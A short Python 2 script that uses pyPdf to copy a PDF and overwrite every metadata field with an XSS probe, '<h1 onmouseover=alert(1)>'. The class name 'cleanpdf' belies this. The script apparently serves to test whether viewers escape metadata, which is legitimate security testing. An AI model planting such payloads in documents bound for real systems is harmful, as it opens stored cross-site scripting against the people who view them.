from pyPdf import PdfFileReader,PdfFileWriter
from pyPdf.generic import createStringObject

class cleanpdf:
	
	def __init__(self,pathFile):
		
		self.pathFile = pathFile
		self.inputFile = file(self.pathFile,"rb")
		self.pdfInput = PdfFileReader(self.inputFile)
		self.pyPdfOutput = PdfFileWriter()
		self.dataToUpdate = self.pyPdfOutput._info.getObject()
		self.__modifyData()
		self.__copyPDF()
	
	def __modifyData(self):
		
		for data in self.dataToUpdate:
			self.dataToUpdate[data] = createStringObject(('<h1 onmouseover=alert(1)>').encode('ascii'))
	
	def __copyPDF(self):
		
		for page in range(0,self.pdfInput.getNumPages()):
			self.pyPdfOutput.addPage(self.pdfInput.getPage(page))
		outputFile = file(self.__changeName(),"wb")
		self.pyPdfOutput.write(outputFile)
	
	def __changeName(self):
		
		newName = self.pathFile[0:self.pathFile.rfind(".")]+"5.pdf"
		return newName
		
cleanpdf("test.pdf")
